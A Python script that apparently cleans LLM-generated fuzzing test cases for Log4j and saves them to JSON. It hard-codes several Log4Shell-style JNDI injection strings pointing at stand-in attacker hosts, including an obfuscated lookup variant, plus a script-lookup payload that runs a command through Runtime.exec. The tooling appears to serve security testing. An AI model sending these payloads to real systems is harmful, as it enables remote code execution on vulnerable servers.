import json
import re
import os

def clean_test_cases():
    """Clean up the generated test cases."""
    try:
        # Read the raw JSON file
        with open("generated_tests/log4j_test_cases.json", "r") as f:
            raw_test_cases = json.load(f)

        # List to hold cleaned test cases
        cleaned_test_cases = []

        # Process each test case
        for test_case in raw_test_cases:
            # Remove code block markers and explanation text
            test_case = re.sub(r'```[^\n]*\n', '', test_case)
            test_case = re.sub(r'```', '', test_case)
            test_case = re.sub(r'Here are some potential test cases.*?:\n\n', '', test_case, flags=re.DOTALL)
            test_case = re.sub(r'Please note that these test cases.*', '', test_case, flags=re.DOTALL)

            # Remove section headers like "1. fuzzPatternLayout:" and any explanatory text
            test_case = re.sub(r'\d+\.\s*fuzz[A-Za-z]+:.*?\n', '', test_case)

            # Split by newlines and add non-empty lines as separate test cases
            for line in test_case.strip().split('\n'):
                line = line.strip()
                if line:
                    # Replace escaped characters with actual characters
                    line = line.replace('\\n', '\n').replace('\\t', '\t').replace('\\r', '\r')
                    line = line.replace('\\x00', '\x00').replace('\\xFF', '\xFF')
                    line = line.replace('\\"', '"').replace('\\\\', '\\')

                    # Add some actual JNDI exploit strings
                    if '${jndi:' in line:
                        cleaned_test_cases.append(line)
                    elif '%' in line or '${' in line:
                        cleaned_test_cases.append(line)
                    elif '{' in line and '}' in line:
                        cleaned_test_cases.append(line)
                    elif len(line) > 5:  # Avoid very short meaningless fragments
                        cleaned_test_cases.append(line)

        # Add some specific test cases that are known to be useful
        additional_test_cases = [
            "${jndi:ldap://malicious.example.com/payload}",
            "${jndi:rmi://attacker.com/object}",
            "%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n",
            "${${env:ENV_NAME:-j}ndi${::-:}ldap://malicious.com/}",
            "{\"message\": \"%m\", \"level\": \"%p\", \"nested\": {\"field1\": \"%d\", \"field2\": \"%t\"}}",
            "Format with {0} and {1} and {999}",
            "${ctx:userID} ${ctx:loginID}",
            "%notaformat %anothernonformat %%percent",
            "${script:javascript:java.lang.Runtime.getRuntime().exec('calc.exe')}"
        ]

        # Add the additional test cases and remove duplicates
        cleaned_test_cases.extend(additional_test_cases)
        cleaned_test_cases = list(set(cleaned_test_cases))

        # Save cleaned test cases
        with open("generated_tests/cleaned_test_cases.json", "w") as f:
            json.dump(cleaned_test_cases, f, indent=2)

        print(f"Cleaned {len(raw_test_cases)} raw test cases into {len(cleaned_test_cases)} useful test cases")
        return cleaned_test_cases

    except Exception as e:
        print(f"Error cleaning test cases: {e}")
        return []

if __name__ == "__main__":
    clean_test_cases()